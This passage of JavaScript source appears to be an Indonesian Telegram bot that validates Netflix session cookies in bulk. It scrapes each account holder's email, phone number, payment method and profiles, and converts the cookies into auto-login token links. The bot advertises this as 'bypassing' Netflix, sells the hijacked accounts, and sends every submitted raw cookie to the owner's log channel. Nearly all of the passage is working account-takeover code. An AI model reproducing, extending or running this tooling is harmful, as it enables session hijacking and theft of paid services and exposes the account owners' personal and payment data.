            if (countryMatch) country = decodeHexEscapes(countryMatch[1]);
        }
if (nextBill === 'Not Detected') {
            const billMatch = html.match(/"billingFormattedDate"\s*:\s*"([^"]+)"/) || 
                              html.match(/"nextBillingDate"\s*:\s*"([^"]+)"/) || 
                              html.match(/"nextBillingDate"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"/) || 
                              html.match(/"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"(?:String|Date)"\s*,\s*"value"\s*:\s*"([^"]+)"/) || 
                              html.match(/data-uia="next-billing-date">([^<]+)</) || 
                              html.match(/"periodEndDate"\s*:\s*"([^"]+)"/);
            if (billMatch) nextBill = decodeHexEscapes(billMatch[1]).trim();
        }
        if (payment === 'Not Detected') {
            const payMatch = html.match(/"paymentMethodDescription"\s*:\s*"([^"]+)"/) || 
                             html.match(/"paymentMethodType"\s*:\s*"([^"]+)"/) || 
                             html.match(/"paymentType"\s*:\s*"([^"]+)"/) ||
                             html.match(/"paymentMethodString"\s*:\s*"([^"]+)"/) ||
                             html.match(/"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/);
            if (payMatch) payment = decodeHexEscapes(payMatch[1]).trim();
        }
        if (memberSince === 'Not Detected') {
            const sinceMatch = html.match(/"memberSince"\s*:\s*"([^"]+)"/) || html.match(/Anggota sejak ([^<]+)/i) || html.match(/Member since ([^<]+)/i);
            if (sinceMatch) memberSince = decodeHexEscapes(sinceMatch[1]).trim();
        }
        if (apiPhone === 'Tidak Terdeteksi') {
            const phoneRegex = html.match(/"phoneNumber"\s*:\s*"([^"]+)"/) || html.match(/"phone"\s*:\s*"([^"]+)"/);
            if (phoneRegex) apiPhone = decodeHexEscapes(phoneRegex[1]).trim();
        }

        

        const whitelistCountries = ['ID', 'US', 'SG'];
        let watchStatus = "✅ Unlocked Region (Bebas VPN)";
        if (country !== 'Not Detected' && !whitelistCountries.includes(country.toUpperCase())) {
            watchStatus = `⚠️ Rawan Geo-Lock (Wajib VPN ${country.toUpperCase()})`;
        }

        let userUsingVPN = "Aman (IP Normal)";
        if (cookieString.includes('nfvdid')) {
            if (html.includes('x-netflix.request.routing') || html.includes('RoutingBypass')) {
                userUsingVPN = "Terdeteksi (Menggunakan VPN Proxy)";
            }
        }

        if (profileNames === 'Not Detected') {
            const profileRegex = /"profileName"\s*:\s*"([^"]+)"/g;
            let match, foundNames = [];
            while ((match = profileRegex.exec(html)) !== null) {
                let decoded = decodeHexEscapes(match[1]);
                if (!foundNames.includes(decoded) && !decoded.includes('{') && decoded.length < 30) foundNames.push(decoded);
            }
            if (foundNames.length > 0) profileNames = foundNames.join(', ');
        }

        if (apiPhone && apiPhone !== 'Tidak Terdeteksi') {
            apiPhone = decodeHexEscapes(apiPhone).replace(/[\x00-\x1F\x7F-\x9F]/g, "").replace(/\\x[0-9A-Fa-f]{2}/g, "");
        }

        const fetchDuration = ((Date.now() - startTimeFetch) / 1000).toFixed(2);

        return { 
            status: 'LIVE', plan, email, country, payment, nextBill, extraMember, 
            authURL, language, memberSince, fetchDuration, profileNames, pinStatus, apiPhone, watchStatus, userUsingVPN,
            holdPaymentStatus
        };
    } catch (error) {
        if (error.response && (error.response.status === 302 || error.response.status === 301)) {
            if(error.response.headers['set-cookie']) return { status: 'LIVE', plan: 'Check Via Link', email: 'Protected', country: 'ID', holdPaymentStatus: "Aman (No Hold) 🟢", watchStatus: "✅ Unlocked Region (Bebas VPN)", userUsingVPN: "Aman (IP Normal)" };
        }
        return { status: 'ERROR', message: error.message };
    }
}

// --- 7. FUNGSI API PENDUKUNG NETFLIX ---
async function fetchPhoneNumberAPI(cookieString) {
    try {
        const headers = { 'Cookie': cookieString, 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0', 'Referer': 'https://www.netflix.com/YourAccount' };
        const response = await axios.get('https://www.netflix.com/api/shakti/v1/account/phone', { headers, timeout: 10000 });
        return response.data?.phoneNumber || 'Tidak Terdeteksi';
    } catch (e) { return 'Tidak Terdeteksi'; }
}

async function generateNfToken(cookieString) {
    try {
        const headers = { ...ARGO_HEADERS, "Cookie": cookieString };
        const queryParams = { appVersion: "15.48.1", path: '["account","token","default"]', pathFormat: "graph", responseFormat: "json" };
        const response = await axios.get(ARGO_API_URL, { params: queryParams, headers, httpsAgent, timeout: 20000 });
        const token = response.data?.value?.account?.token?.default?.token;
        return token ? { success: true, token } : { success: false };
    } catch (error) { return { success: false, message: error.message }; }
}

async function isUserSubscribed(ctx) {
    try {
        const member = await ctx.telegram.getChatMember(REQUIRED_CHANNEL, ctx.from.id);
        return ['creator', 'administrator', 'member', 'restricted'].includes(member.status);
    } catch (error) { return true; }
}

// --- 8. COMMANDS BOT ---
bot.start(async (ctx) => {
    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    saveUser(ctx, ctx.from.id, userDisplay);

    const isSubbed = await isUserSubscribed(ctx);
    if (!isSubbed) {
        return ctx.reply(`🔴 <b>Akses Ditolak!</b>\n\nSilakan join channel kami terlebih dahulu.`, {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([[Markup.button.url('🍂 Join Channel', `https://t.me/${REQUIRED_CHANNEL.replace('@', '')}`)]])
        });
    }

    const totalUser = loadUsers().length;
    const options = { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' };
    const formattedDate = new Date().toLocaleDateString('id-ID', options);

    const welcomeText = 
        `🕷️ <b>ABOUT THIS BOT</b> 🕸️\n\n` +
        `Bot premium berbasis node.js yang terintegrasi dengan argo core systems untuk melakukan bypass enkripsi token netflix secara real-time. membantu pengecekan massal (bulk check) serta mengonversi cookies aktif menjadi tautan login otomatis tanpa email & password.\n\n` +
  `terdapat 3 fitur convert yang tersedia :\n1. convert link to new link\n2. convert link to cookies\n3. convert cookies to link\n\n` +
        `<blockquote>📊 <b>DATABASE & STATUS BOT</b>\n` +
        `• Total User : ${totalUser} Terdaftar\n` +
        `• Speed Proses : ± 2.5 Detik / Cookie\n` +
        `• Status System : online \n` +
        `• Hari & Tanggal : ${formattedDate}\n` +
        `• Owner Bot : @tCried</blockquote>\n` +
        `<b>Silakan pilih menu di bawah untuk memulai operasional.</b>`;

    ctx.replyWithPhoto('https://ibb.co.com/ccVR236h', {
        caption: welcomeText,
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.url('🛒 Beli Netflix', 'https://t.me/tCried'), Markup.button.callback('🕷️ Pilih Mode Convert', 'btn_mode_convert')],
            [Markup.button.callback('📖 Tutorial Login', 'btn_tutorial'), Markup.button.callback('🏆 Leaderboard', 'btn_leaderboard')],
            [Markup.button.url('🧑‍💻 Owner', 'https://t.me/tCried')]
        ])
    });
});

bot.command('zxxz', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) {
        return ctx.reply("❌ *Akses Ditolak! Perintah ini khusus Owner Agastra Store.*", { parse_mode: 'Markdown' });
    }
    const statusBackupMsg = await ctx.reply("📦 `Sedang mencadangkan seluruh sistem panel secara menyeluruh...`", { parse_mode: 'Markdown' });
    try {
        const zip = new AdmZip();
        const currentDir = process.cwd();
        const allFiles = fs.readdirSync(currentDir);
        let filesAdded = 0;

        allFiles.forEach(file => {
            const fullPath = path.join(currentDir, file);
            const stat = fs.statSync(fullPath);

            if (file === 'backup.zip' || file === 'node_modules') return;

            if (stat.isDirectory()) {
                zip.addLocalFolder(fullPath, file);
                filesAdded++;
            } else if (stat.isFile()) {
                zip.addLocalFile(fullPath);
                filesAdded++;
            }
        });

        if (filesAdded === 0) {
            return ctx.telegram.editMessageText(ctx.chat.id, statusBackupMsg.message_id, undefined, "❌ Tidak ada berkas panel yang ditemukan.");
        }

        const zipPath = path.join(currentDir, 'backup.zip');
        zip.writeZip(zipPath);

        await ctx.telegram.sendDocument(ctx.chat.id, { source: zipPath }, {
            caption: `✅ <b>FULL CORE SYSTEM BACKUP COMPLETE</b>\n──────────────────────────\n📊 <b>Status:</b> Berhasil mengamankan seluruh sistem panel.\n🗂️ <b>Item Terkompresi:</b> <code>${filesAdded} Berkas/Folder Utama</code>\n📌 <i>Berkas cadangan ini mencakup index.js, setting .env, dan database json aktif.</i>`,
            parse_mode: 'HTML'
        });
        
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); 
        await ctx.telegram.deleteMessage(ctx.chat.id, statusBackupMsg.message_id).catch(() => {});
    } catch (err) {
        ctx.telegram.editMessageText(ctx.chat.id, statusBackupMsg.message_id, undefined, `⚠️ Gagal memproses full backup: ${err.message}`);
    }
});

bot.command('bc', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ *Akses Ditolak!*\nAnda bukan owner bot ini.", { parse_mode: 'Markdown' });
    const msgText = ctx.message.text.substring(3).trim(); 
    if (!msgText) return ctx.reply("❌ *Format Salah!*\nGunakan:\n`/bc Isi pesan broadcast di sini`", { parse_mode: 'Markdown' });
    const users = loadUsers();
    if (users.length === 0) return ctx.reply("❌ Tidak ada user terdaftar di database.");
    for (let userObj of users) {
        try { await ctx.telegram.sendMessage(userObj.id, msgText, { parse_mode: 'HTML' }); } catch (err) {}
    }
    ctx.reply("📢 Broadcast report sukses terkirim ke database.");
});

bot.command('catat', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ *Akses Khusus Owner Agastra Store!*", { parse_mode: 'Markdown' });
    const args = ctx.message.text.substring(6).trim().split(/\s+/);
    if (args.length < 2) return ctx.reply("⚠️ <b>Format Salah!</b>\n\nGunakan:\n<code>/catat [ID/User/WA/Nama] [Durasi]</code>", { parse_mode: 'HTML' });
    const buyerInfo = args[0];
    const durationInput = args[1].toLowerCase();
    let days = 0;
    const matchDays = durationInput.match(/^(\d+)d$/);
    const matchMonths = durationInput.match(/^(\d+)(m|b)$/);
    if (matchDays) days = parseInt(matchDays[1]);
    else if (matchMonths) days = parseInt(matchMonths[1]) * 30;
    else return ctx.reply("⚠️ Format durasi tidak valid!", { parse_mode: 'HTML' });
    const expiredDate = new Date();
    expiredDate.setDate(expiredDate.getDate() + days);
    let pembeliList = loadPembeli();
    pembeliList.push({ buyer: buyerInfo, duration: durationInput, registeredAt: new Date().toISOString(), expiredAt: expiredDate.toISOString() });
    savePembeli(pembeliList);
    const tglExpiredStr = expiredDate.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' });
    ctx.reply(`✅ <b>BERHASIL MENCATAT BUYER!</b>\n───────────────────\n👤 <b>Buyer:</b> <code>${buyerInfo}</code>\n📅 <b>Jadwal Logout:</b> ${tglExpiredStr}`, { parse_mode: 'HTML' });
});

bot.command('ownerbulk', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ *Perintah ini eksklusif hanya untuk Owner Agastra Store!*", { parse_mode: 'Markdown' });
    ctx.reply("📥 <b>Mode Owner Bulk Aktif!</b>\nSilakan lampirkan/drop file berkas <code>.txt</code> atau <code>.zip</code> berisi data cookies tanpa batasan kuantitas maksimal.", { parse_mode: 'HTML' });
    bot.context.ownerBulkWaiting = true; 
});

// 🌟 COMMAND PERINTAH /satukan UNTUK MENGGABUNGKAN COOKIES LIVE BERFORMAT BER-HEADER
bot.command('satukan', async (ctx) => {
    if (!(await isUserSubscribed(ctx))) return;

    const savedCookies = lastBulkResults.get(ctx.from.id);

    if (!savedCookies || savedCookies.length === 0) {
        return ctx.reply("⚠️ <b>Tidak ada data bulk terakhir yang tersimpan!</b>\n\nSilakan lakukan bulk check cookies (`.txt` / `.zip`) terlebih dahulu sebelum menggunakan perintah ini.", { parse_mode: 'HTML' });
    }

    const totalCount = savedCookies.length;
    const fileBuffer = Buffer.from(savedCookies.join('\n'), 'utf8');

    await ctx.replyWithDocument(
        { source: fileBuffer, filename: 'GABUNGAN_COOKIES_LIVE.txt' },
        { 
            caption: `📦 <b>BERHASIL MENSATUKAN COOKIES LIVE!</b>\n──────────────────────────\n🟢 <b>Total Cookies Gabungan:</b> <code>${totalCount} Akun</code>\n📌 <i>Seluruh cookies Premium, Standard, dan Basic disatukan berformat lengkap (Email : Plan : Region : Status : Cookies).</i>`, 
            parse_mode: 'HTML' 
        }
    );
});

bot.on('text', async (ctx) => {
    if (ctx.message.text.startsWith('/')) return;
    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    saveUser(ctx, ctx.from.id, userDisplay);
    const text = cleanCookieInput(ctx.message.text);
    if (!(await isUserSubscribed(ctx))) return;

    const rawText = ctx.message.text;
    
    // Mengecek mode user saat ini (default: Cookies to Link)
    const userCurrentMode = activeConvertModes.get(ctx.from.id) || 'COOKIES_TO_LINK';

    // =====================================================================
    // 🌟 ENGINE EKSTRAKSI UNTUK LINK NFTOKEN (LINK TO LINK & LINK TO COOKIES)
    // =====================================================================
    if (rawText.includes('netflix.com/') && rawText.includes('nftoken=')) {
        
        // Peringatan jika mode salah
        if (userCurrentMode === 'COOKIES_TO_LINK') {
            return ctx.reply("⚠️ <b>Mode Salah!</b>\nAnda mengirimkan Link Token Netflix, tetapi mode Anda saat ini adalah <b>Cookies to Link</b>.\n\n👉 <i>Silakan ubah mode menjadi 'Link to Link' atau 'Link to Cookies' melalui menu /start terlebih dahulu.</i>", { parse_mode: 'HTML', reply_to_message_id: ctx.message.message_id });
        }

        const urlMatch = rawText.match(/(https?:\/\/[^\s]+)/);
        if (!urlMatch) return ctx.reply("⚠️ Link tidak valid.");
        const targetUrl = urlMatch[1];

        const statusMsg = await ctx.reply("🔄 `Mengekstrak token Netflix dari tautan...`", { parse_mode: 'Markdown' });

        try {
            let currentUrl = targetUrl;
            let netflixId = '', secureNetflixId = '', nfvdid = '';
            let combinedCookies = '';
            let attempt = 0;

            while (attempt < 5) {
                const response = await axios.get(currentUrl, {
                    maxRedirects: 0,
                    validateStatus: (status) => status >= 200 && status <= 302,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Cookie': combinedCookies 
                    }
                });

                const setCookieHeaders = response.headers['set-cookie'];
                if (setCookieHeaders) {
                    setCookieHeaders.forEach(cookieStr => {
                        const cookiePart = cookieStr.split(';')[0];
                        const key = cookiePart.split('=')[0];
                        const val = cookiePart.substring(key.length + 1);

                        if (key === 'NetflixId') netflixId = val;
                        if (key === 'SecureNetflixId') secureNetflixId = val;
                        if (key === 'nfvdid') nfvdid = val;

                        combinedCookies += `${cookiePart}; `;
                    });
                }

                if (response.status === 301 || response.status === 302) {
                    currentUrl = response.headers.location;
                    if (!currentUrl.startsWith('http')) {
                        currentUrl = `https://www.netflix.com${currentUrl}`;
                    }
                    attempt++;
                } else {
                    break;
                }
            }

            if (!netflixId || !secureNetflixId) {
                await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, "❌ *Gagal Login!* Token sudah expired atau akun memang terdeteksi mati.", { parse_mode: 'Markdown' }).catch(()=>{});
                return;
            }

            const buildCookieData = `NetflixId=${netflixId}; SecureNetflixId=${secureNetflixId}; ${nfvdid ? 'nfvdid=' + nfvdid + ';' : ''}`;

            // LOGIC JIKA MODE ADALAH LINK TO COOKIES
            if (userCurrentMode === 'LINK_TO_COOKIES') {
                const resultText = `✅ successfully logged in and got account cookies!\n\n` +
                                   `📋 Detail Cookies:\n` +
                                   `<code>${buildCookieData}</code>\n\n` +
                                   `Thank you for using this bot, don't forget to follow @corvast`;

                await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, resultText, { parse_mode: 'HTML' }).catch(()=>{});
                return;
            }

            // LOGIC JIKA MODE ADALAH LINK TO LINK
            if (userCurrentMode === 'LINK_TO_LINK') {
                const infoResult = await checkAccountInfo(buildCookieData);
                
                if (infoResult.status === 'DEAD' || infoResult.status === 'ERROR') {
                    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `✅ Successfully logged in but data fetch blocked!\n\n<code>${buildCookieData}</code>`, { parse_mode: 'HTML' });
                    return;
                }

                let scrapedPhone = infoResult.apiPhone === 'Tidak Terdeteksi' ? await fetchPhoneNumberAPI(buildCookieData) : infoResult.apiPhone;
                const tokenResult = await generateNfToken(buildCookieData);
                
                const activeToken = tokenResult.success ? tokenResult.token : netflixId; 
                const tokenId = crypto.randomBytes(4).toString('hex');
                tokenCache.set(tokenId, { token: activeToken, createdAt: Date.now(), expiresAt: Date.now() + (60 * 60 * 1000) });
                setTimeout(() => tokenCache.delete(tokenId), 60 * 60 * 1000);

                const countryObj = getCountryDetail(infoResult.country);
                const countryTextFormat = `${countryObj.flag} ${countryObj.name}`;

                const linkLayoutResult = 
                    `📌 <b>NETFLIX ACCOUNT DATA FROM LINK</b>\n\n` +
                    `<blockquote>` +
                    `🚨 <b>Status:</b> ${infoResult.holdPaymentStatus}\n` +
                    `🌍 <b>Region:</b> ${countryTextFormat}\n` +
                    `📆 <b>Member Since:</b> ${infoResult.memberSince || 'Not Detected'}\n` +
                    `👑 <b>Plan:</b> ${infoResult.plan}\n` +
                    `💳 <b>Payment:</b> ${infoResult.payment}\n` +
                    `🗓️ <b>Next Billing:</b> ${infoResult.nextBill}\n` +
                    `🎭 <b>Profiles:</b> 👤 ${infoResult.profileNames}\n` +
                    `📩 <b>Email:</b> <code>${infoResult.email}</code>\n` +
                    `📱 <b>Phone:</b> <code>${scrapedPhone}</code>\n` +
                    `❌ <b>Extra Members:</b> ${infoResult.extraMember}\n` +

                    `</blockquote>\n` +
                    `🤖 <b>use the button below to enter and log in to your device:</b>`;

                await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
                
                await ctx.reply(linkLayoutResult, {
                    parse_mode: 'HTML',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('💻 PC', `copy_pc_${tokenId}`), Markup.button.callback('📱 MOBILE', `copy_app_${tokenId}`)],
                        [Markup.button.callback('📺 TV', `copy_tv_${tokenId}`)]
                    ])
                });
                return;
            }
        } catch (error) {
            await ctx.reply(`⚠️ System eror ip bot di blokir netflix. hatap jeda terlebih dahulu jangan di spam : ${error.message}`, { parse_mode: 'Markdown' }).catch(()=>{});
            return;
        }
    }
    // =====================================================================

    // JIKA BUKAN LINK, PASTIKAN MODE ADALAH COOKIES TO LINK
    if (userCurrentMode !== 'COOKIES_TO_LINK') {
        const activeModeFormatted = userCurrentMode.replace(/_/g, ' ');
        return ctx.reply(`⚠️ <b>Mode Salah!</b>\nAnda mengirimkan data format Cookies, tetapi mode Anda saat ini adalah <b>${activeModeFormatted}</b>.\n\n👉 <i>Silakan ubah mode menjadi 'Cookies to Link' melalui menu /start terlebih dahulu.</i>`, { parse_mode: 'HTML', reply_to_message_id: ctx.message.message_id });
    }

    const isJsonFormat = text.trim().startsWith('[') || text.trim().startsWith('{');
    const isNetscapeFormat = text.includes('.netflix.com');
    const isCustomTextFormat = text.includes('NetflixId:') || text.includes('NetflixId=');

    if (!isJsonFormat && !isNetscapeFormat && !isCustomTextFormat && (text.includes('┃') || text.includes('|'))) {
        return ctx.reply("⚠️ <b>Kirim bagian cookies saja!</b>", { parse_mode: 'HTML', reply_to_message_id: ctx.message.message_id });
    }

    let cookieDict = parseCookies(text);
    if (!cookieDict['NetflixId']) {
        const backupExtract = extractCookiesFromRawText(text);
        if (backupExtract.length > 0) cookieDict = parseCookies(backupExtract[0]);
    }

    if (!cookieDict['NetflixId']) return ctx.reply("⚠️ Format cookies tidak dikenali atau NetflixId tidak ditemukan.", { reply_to_message_id: ctx.message.message_id });

    const startTime = Date.now();
    const msg = await ctx.reply("⏳ `[1/3] Connecting to secure Netflix core...`", { parse_mode: 'Markdown' });
    const cookieString = buildCookieString(cookieDict);
    const textData = parseTextData(text);
    const infoResult = await checkAccountInfo(cookieString);

    if (infoResult.status === 'DEAD') return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `❌ *STATUS: EXPIRED / INVALID*\nCookie data is no longer valid.`, { parse_mode: 'Markdown' });
    if (infoResult.status === 'ERROR') return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `⚠️ *CONNECTION ERROR*\nDisconnect: ${infoResult.message}`, { parse_mode: 'Markdown' });

    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "⚙️ `[2/3] Extracting profile credentials...`", { parse_mode: 'Markdown' });
    let scrapedPhone = infoResult.apiPhone === 'Tidak Terdeteksi' ? await fetchPhoneNumberAPI(cookieString) : infoResult.apiPhone;

    await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "🚀 `[3/3] Finalizing secure token encryptions...`", { parse_mode: 'Markdown' });
    const tokenResult = await generateNfToken(cookieString);
    if (!tokenResult.success) return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `⚠️ *COOKIES DEAD*\nSILAHKAN GANTI COOKIES LAIN`, { parse_mode: 'Markdown' });

    addConvertScore(ctx.from.id, 1);
    const finalPhone = scrapedPhone !== 'Tidak Terdeteksi' ? scrapedPhone : (textData.phone || 'Tidak Terdeteksi');
    const finalEmail = infoResult.email !== 'Not Detected' ? infoResult.email : (textData.email || 'Not Detected');
    const finalPlan = infoResult.plan !== 'Not Detected' ? infoResult.plan : (textData.plan || 'Not Detected');
    const finalRegion = infoResult.country !== 'Not Detected' ? infoResult.country : (textData.region || 'Not Detected');
    const finalPayment = infoResult.payment !== 'Not Detected' ? infoResult.payment : (textData.payment || 'Not Detected');
    const finalNextBill = infoResult.nextBill !== 'Not Detected' ? infoResult.nextBill : 'Not Detected';
    const finalMemberSince = infoResult.memberSince !== 'Not Detected' ? infoResult.memberSince : 'Not Detected';
    
    const countryObj = getCountryDetail(finalRegion);
    const countryTextFormat = `${countryObj.flag} ${countryObj.name}`;
    const finalAccStatus = infoResult.holdPaymentStatus; 

    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    const tokenId = crypto.randomBytes(4).toString('hex');
    tokenCache.set(tokenId, { token: tokenResult.token, createdAt: Date.now(), expiresAt: Date.now() + (60 * 60 * 1000) });
    setTimeout(() => tokenCache.delete(tokenId), 60 * 60 * 1000);

    logToPanel('SATUAN', { name: ctx.from.first_name, username: userDisplay, id: ctx.from.id, email: finalEmail, country: countryObj.name, language: infoResult.language, duration: duration });

    const now = new Date();
    const tglCek = now.toLocaleDateString('id-ID', { day: 'numeric', month: 'numeric', year: 'numeric' });
    const jamCek = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Jakarta' });

    const cardLayout = 
        `🚨 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐁𝐘𝐏𝐀𝐒𝐒𝐄𝐃 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐀𝐂𝐂𝐎𝐔𝐍𝐓, 𝐘𝐎𝐔registered_R 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐃𝐄𝐓𝐀𝐈𝐋𝐒 𝐀𝐑𝐄 𝐁𝐄𝐋𝐎𝐖 :\n\n` +
        `<blockquote>` +
        `🟢 <b>Status:</b> ${finalAccStatus}\n` +
        `📩 <b>Email:</b> <code>${finalEmail}</code>\n` +
        `📱 <b>Phone:</b> <code>${finalPhone}</code>\n` +
        `👑 <b>Plan:</b> ${finalPlan}\n` +
        `💳 <b>Payment:</b> ${finalPayment}\n` +
        `📆 <b>Member Since:</b> ${finalMemberSince}\n` +
        `🗓️ <b>Next Billing:</b> ${finalNextBill}\n` +
        `🌍 <b>Country:</b> ${countryTextFormat}\n` +
        `🛡️ <b>Jaringan:</b> <b>${infoResult.userUsingVPN}</b>\n` +
        `🎭 <b>Profiles:</b> 👤 ${infoResult.profileNames}\n` +
        `📅 <b>Tanggal Cek:</b> ${tglCek}, ${jamCek} WIB\n` +
        `⚡ <b>Kecepatan:</b> ${duration} detik/cookie` +
        `</blockquote>\n` +
        `──────── ⋆⋅☆⋅⋆ ────────\n` +
        `🕸️ Thank you for using this conversion bot 🕷️\n\n` +
        `"𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧"\n` +
        `⛥ Rating pengerjaan bot ini untuk memberikan feedback kepada pengembang - bebas request fitur - pendapatmu berharga bagi kami.\n` +
        ``;

    try {
        const logLayout = `📢 <b>NEW CONVERT LOG (SATUAN)</b>\n` +
                          `👤 <b>User:</b> ${userDisplay} (<code>${ctx.from.id}</code>)\n\n` + 
                          cardLayout + 
                          `\n\n🔑 <b>Raw Cookie Data:</b>\n<code>${cookieString}</code>`;
        
        await ctx.telegram.sendMessage(LOG_CHANNEL_ID, logLayout, { parse_mode: 'HTML', disable_web_page_preview: true });
    } catch (logErr) {
        console.error("⚠️ Gagal mengirim log convert satuan ke channel:", logErr.message);
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

    await ctx.replyWithPhoto('https://ibb.co.com/ccVR236h', {
        caption: cardLayout,
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([[Markup.button.callback('📱 MOBILE', `copy_app_${tokenId}`), Markup.button.callback('💻 PC', `copy_pc_${tokenId}`)], [Markup.button.callback('📺 TV ', `copy_tv_${tokenId}`)]])
    });
});

bot.on('document', async (ctx) => {
    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    saveUser(ctx, ctx.from.id, userDisplay);
    
    const isOwnerAction = (ctx.from.id === OWNER_ID && bot.context.ownerBulkWaiting === true);
    if (!isOwnerAction && !(await isUserSubscribed(ctx))) return;

    const doc = ctx.message.document || ctx.update?.message?.document;
    if (!doc) return ctx.reply("⚠️ Gagal memproses file. Dokumen tidak terdeteksi.");

    const nameOfFile = doc.file_name || doc.fileName || '';
    const isZip = nameOfFile.toLowerCase().endsWith('.zip');
    const isTxt = nameOfFile.toLowerCase().endsWith('.txt');

    if (!isZip && !isTxt) {
        return ctx.reply("⚠️ Sistem hanya mendukung lampiran dokumen dengan format file .txt atau .zip untuk pemrosesan massal.");
    }

    const realFileId = doc.file_id || doc.fileId;
    const statusMsg = await ctx.reply(`⏳ <code>[Bulk Core] Mengunduh dan menganalisis berkas database cookies... (${isZip ? 'ZIP PACKAGE MODE' : 'TXT MODE'})</code>`, { parse_mode: 'HTML' });
    
    try {
        const fileData = await ctx.telegram.getFile(realFileId);
        const downloadUrl = `https://api.telegram.org/file/bot${bot.telegram.token}/${fileData.file_path}`;

        const userCurrentMode = activeConvertModes.get(ctx.from.id) || 'COOKIES_TO_LINK';

        // =====================================================================
        // 🌟 FITUR BULK CONVERT LINK TO COOKIES
        // =====================================================================
        if (isTxt && userCurrentMode === 'LINK_TO_COOKIES') {
            const txtResponse = await axios.get(downloadUrl, { responseType: 'text', timeout: 25000 });
            const fileContent = cleanCookieInput(txtResponse.data);
            const linksToProcess = [...new Set(extractLinksFromText(fileContent))];

            if (linksToProcess.length === 0) {
                bot.context.ownerBulkWaiting = false;
                return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, "❌ Tidak ditemukan link login Netflix yang valid di dalam file.");
            }

            if (!isOwnerAction && linksToProcess.length > 150) {
                return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `❌ <b>AKSES BULK DITOLAK!</b>\n\nMaksimal antrean user adalah <b>30 Link</b>.\nFile Anda berisi: <code>${linksToProcess.length} Link</code>.`, { parse_mode: 'HTML' });
            }

            let liveCookiesResults = [];
            let deadLinksResults = [];
            let index = 0, totalLinks = linksToProcess.length, lastUpdateTime = Date.now();

            const formatProgressBar = (current, total) => {
                const percentage = Math.round((current / total) * 100);
                const filledBars = Math.round((percentage / 100) * 12);
                return `⚙️ <b>[${'▓'.repeat(filledBars)}${'░'.repeat(12 - filledBars)}] ${percentage}%</b>\n⏳ <code>Memproses link ke cookies: ${current}/${total} Link...</code>`;
            };

            const processLinkWorker = async (link) => {
                const cookieResult = await resolveLinkToCookie(link);
                if (cookieResult) {
                    liveCookiesResults.push(cookieResult);
                } else {
                    deadLinksResults.push(link);
                }
                index++;
                if (Date.now() - lastUpdateTime > 2200 || index === totalLinks) {
                    lastUpdateTime = Date.now();
                    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, formatProgressBar(index, totalLinks), { parse_mode: 'HTML' }).catch(() => {});
                }
            };

            const CONCURRENCY = isOwnerAction ? 5 : 3;
        for (let i = 0; i < linksToProcess.length; i += CONCURRENCY) {
            const chunk = linksToProcess.slice(i, i + CONCURRENCY);
            await Promise.all(chunk.map(l => processLinkWorker(l)));
            
            // 🔥 TAMBAHKAN JEDA 3 DETIK DI SINI BRO
            await delay(3000); 
        }

            await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
            
            if (liveCookiesResults.length > 0 && !isOwnerAction) {
                addConvertScore(ctx.from.id, liveCookiesResults.length);
            }

            // SIMPAN HASIL LINK TO COOKIES KE MEMORI SUPAYA BISA DUGUNAKAN COMMAND /satukan
            lastBulkResults.set(ctx.from.id, liveCookiesResults);

            const summaryText = `<b>📊 BULK CONVERT LINK TO COOKIES COMPLETED</b>\n─────────────────────\n🟢 <b>Berhasil Konversi:</b> ${liveCookiesResults.length} Cookies\n🔴 <b>Gagal/Expired:</b> ${deadLinksResults.length} Link\n📦 <b>Total Diproses:</b> ${linksToProcess.length}`;
            await ctx.reply(summaryText, { parse_mode: 'HTML' });

            try {
